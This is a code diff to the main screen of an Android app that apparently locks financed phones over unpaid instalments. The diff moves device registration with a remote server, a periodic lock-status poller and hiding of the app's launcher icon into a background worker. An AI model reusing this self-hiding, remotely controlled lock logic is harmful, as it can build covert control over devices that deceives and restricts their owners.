@@ -52,13 +52,8 @@ class MainActivity : AppCompatActivity() {
         restrictions.applyPersistentRestrictions()
         tvStatus.text = "Device secured and active."
 
-        val prefs = getSharedPreferences("emi_prefs", Context.MODE_PRIVATE)
-        if (!prefs.getBoolean("isRegistered", false)) {
-            autoRegister()
-        } else {
-            scheduleWorker()
-            hideIcon()
-        }
+        // Registration, polling and hiding the icon happen in RegisterWorker.
+        com.scmemilocker.app.workers.RegisterWorker.enqueue(this)
     }
 
     override fun onResume() {
@@ -77,59 +72,5 @@ class MainActivity : AppCompatActivity() {
                 }
             }
         })
-    }
-
-    private fun autoRegister() {
-        val prefs = getSharedPreferences("emi_prefs", Context.MODE_PRIVATE)
-        var deviceId = prefs.getString("deviceId", null)
-        if (deviceId == null) {
-            deviceId = UUID.randomUUID().toString()
-            prefs.edit().putString("deviceId", deviceId).apply()
-        }
-        val finalDeviceId = deviceId
-
-        com.google.firebase.messaging.FirebaseMessaging.getInstance().token
-            .addOnCompleteListener { task ->
-                val fcmToken = if (task.isSuccessful) task.result else ""
-                val map = mapOf(
-                    "deviceId" to finalDeviceId,
-                    "userName" to (Build.MANUFACTURER + " " + Build.MODEL),
-                    "phoneNumber" to "",
-                    "fcmToken" to fcmToken
-                )
-                val body = gson.toJson(map)
-                    .toRequestBody("application/json; charset=utf-8".toMediaType())
-                client.newCall(Request.Builder().url("$BASE_URL/register").post(body).build())
-                    .enqueue(object : Callback {
-                        override fun onFailure(call: Call, e: IOException) {
-                            Log.e("EmiRegister", "register failed", e)
-                        }
-                        override fun onResponse(call: Call, response: Response) {
-                            prefs.edit()
-                                .putBoolean("isRegistered", true)
-                                .putString("fcmToken", fcmToken)
-                                .apply()
-                            scheduleWorker()
-                            runOnUiThread { hideIcon() }
-                        }
-                    })
-            }
-    }
-
-    private fun hideIcon() {
-        try {
-            packageManager.setComponentEnabledSetting(
-                ComponentName(this, MainActivity::class.java),
-                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-                PackageManager.DONT_KILL_APP
-            )
-        } catch (_: Exception) {}
-    }
-
-    private fun scheduleWorker() {
-        val work = PeriodicWorkRequestBuilder<OfflineExpiryWorker>(15, TimeUnit.MINUTES).build()
-        WorkManager.getInstance(this).enqueueUniquePeriodicWork(
-            "LockStatusWorker", ExistingPeriodicWorkPolicy.KEEP, work
-        )
     }
 }
